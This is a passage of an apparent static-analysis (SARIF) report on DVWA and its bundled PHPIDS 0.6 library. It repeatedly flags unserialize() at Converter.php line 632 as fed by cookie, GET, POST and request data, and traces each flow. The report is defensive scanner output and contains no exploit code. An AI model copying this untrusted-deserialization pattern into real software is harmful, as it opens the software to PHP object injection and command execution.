                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - runall(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:319 - runcentrifuge(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 319
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4486",
      "message" : {
        "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "565518B28F812D81537A8352998F3075"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
          },
          "region" : {
            "startLine" : 632,
            "endLine" : 632,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:45 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 45
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:45 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 45
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - runall(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:319 - runcentrifuge(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 319
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4565",
      "message" : {
        "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "7D1FF7EFA69DA5A8E2CAA88F235A5B4C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
          },
          "region" : {
            "startLine" : 632,
            "endLine" : 632,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:62 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 62
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:62 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 62
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:61 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:76 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - runall(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:319 - runcentrifuge(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 319
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4661",
      "message" : {
        "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "C50F3FEE59C9612BA441F21FED597226"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
          },
          "region" : {
            "startLine" : 632,
            "endLine" : 632,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:65 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:65 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:61 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:76 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - runall(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:319 - runcentrifuge(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 319
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4724",
      "message" : {
        "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "EAD43E46304550E7C4F835B8CA3A6601"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
          },
          "region" : {
            "startLine" : 632,
            "endLine" : 632,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:42 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:42 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - runall(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:319 - runcentrifuge(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 319
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4741",
      "message" : {
        "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "F2637D8F1F192D678D54510DCF46220E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
          },
          "region" : {
            "startLine" : 632,
            "endLine" : 632,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:64 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 64
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:64 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 64
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:61 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:76 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - runall(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:319 - runcentrifuge(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 319
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4758",
      "message" : {
        "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "FC6676C3207D671BFC4A83BA33B375A6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
          },
          "region" : {
            "startLine" : 632,
            "endLine" : 632,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:43 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:43 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - runall(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:319 - runcentrifuge(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 319
                }
              }
            }
          }, {
            "location" : {
              "message" : {
